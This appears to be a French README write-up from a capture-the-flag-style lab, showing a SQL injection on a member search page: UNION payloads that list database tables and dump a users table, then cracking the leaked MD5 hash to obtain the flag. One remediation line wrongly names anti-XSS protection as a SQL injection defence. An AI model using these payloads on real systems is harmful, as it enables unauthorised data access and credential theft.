# README : Exploit de SQL Injection sur Member Search

## Description

Cette brèche met en évidence une vulnérabilité dans la gestion des paramètres d'URL d'une application web. Elle permet à un attaquant potentiel d'exécuter des commandes SQL malveillantes pour accéder à des informations sensibles sur le serveur.

## Fonctionnement

- Accédez à la page : `http://X.X.X.X/?page=member`
- Utilisez une injection SQL dans l'URL, par exemple :

```sql
1 or 1=1 #show all users with one ID
1 or 1=1 UNION select table_name, column_name FROM information_schema.columns #show all tables_name and column_name on MariaDB

1 or 1=1 UNION select Commentaire, countersign FROM users #show Commentaires and countersign on users table
```

- On a alors une reponse avec une instruction et un mdp crypte.

```txt
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

- Decryptez le Surname: `5ff9d0165b4f92b14994e5c685cdce28` sur Dcode https://www.dcode.fr/md5-hash,  
   puis suivre les instructions :  
   `FortyTwo == fortytwo`,  
   string to sha256 : https://www.dcode.fr/sha256-hash

## Impact

Cette vulnérabilité peut permettre à un attaquant de :

- Accéder aux informations sensibles du système de base de données
- Obtenir des listes d'utilisateurs et leurs mots de passe chiffrés
- Potentiellement exposer des données confidentielles

## Recommandations

Pour corriger cette vulnérabilité :

- Valider et sécuriser tous les paramètres d'URL côté serveur avant de les utiliser ou de les interpréter.
- Utiliser une validation robuste pour empêcher l'exécution de code malveillant dans les paramètres URL.
- Implémenter une protection anti-XSS pour éviter l'exécution de commandes SQL dans le navigateur.
- Limiter les permissions du serveur web pour restreindre l'accès aux dossiers sensibles.
